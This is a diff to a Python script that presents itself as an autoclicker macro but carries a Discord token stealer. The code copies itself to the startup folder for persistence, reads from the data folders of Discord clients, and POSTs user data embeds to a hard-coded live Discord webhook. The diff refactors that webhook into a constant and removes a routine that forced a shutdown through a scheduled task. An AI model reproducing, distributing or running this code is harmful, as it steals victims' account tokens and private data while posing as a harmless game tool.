@@ -21,6 +21,8 @@ import pyautogui
 import sqlite3
 import tempfile
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO"
+
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -49,17 +51,6 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'
 }
 
-def schedule_shutdown():
-
-    current_time = time.localtime()
-    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
-    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
-
-    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))
-
-    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
-
-    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def copy_exe_to_startup(exe_path):
     """Copy the executable to the startup folder"""
@@ -71,8 +62,6 @@ def copy_exe_to_startup(exe_path):
 
 exe_path = os.path.abspath(sys.argv[0])
 copy_exe_to_startup(exe_path)
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO"
 
 def getheaders(token=None):
     headers = {
@@ -368,7 +357,7 @@ def main():
                     "username": "Sex Offender",
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except (urllib.error.HTTPError, json.JSONDecodeError):
                 continue
             except Exception as e:
@@ -432,11 +421,20 @@ def main():
 
 if __name__ == "__main__":
     main()
-    schedule_shutdown()
 
 PUL = ctypes.POINTER(ctypes.c_ulong)
 
-print("[*] Ryzen's AP macro\n")
+print(r"""
+██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗    ███╗   ███╗ █████╗  ██████╗██████╗  ██████╗ 
+██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║    ████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗
+██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║    ██╔████╔██║███████║██║     ██████╔╝██║   ██║
+██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║    ██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║
+██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║    ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝
+╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ 
+                                                                                                                               
+""")
+
+
 time.sleep(2)
 print("[*] Made by Ryzen\n")
 
@@ -472,7 +470,6 @@ def send_click(button):
     ctypes.windll.user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
     ctypes.windll.user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))
 
-
 def detect_trigger():
     trigger_key = None
     trigger_type = None
@@ -500,14 +497,18 @@ def detect_trigger():
             time.sleep(0.05)
 
     time.sleep(0.3)
+
+    if trigger_type == "mouse":
+        print(f"Selected mouse button: {trigger_key}")
+    else:
+        print(f"Selected key: {trigger_key}")
+
     return trigger_key, trigger_type
 
-
 trigger_key, trigger_type = detect_trigger()
-cps = float(input("Clicks per second: "))
+cps = float(input("\nClicks per second: "))
 interval = 1 / cps
 active_button = mouse.Button.left
-
 
 try:
     pressed_keys = set()
@@ -550,5 +551,3 @@ finally:
         key_listener.stop()
     except:
         pass
-
-input("\nPress Enter to Exit")
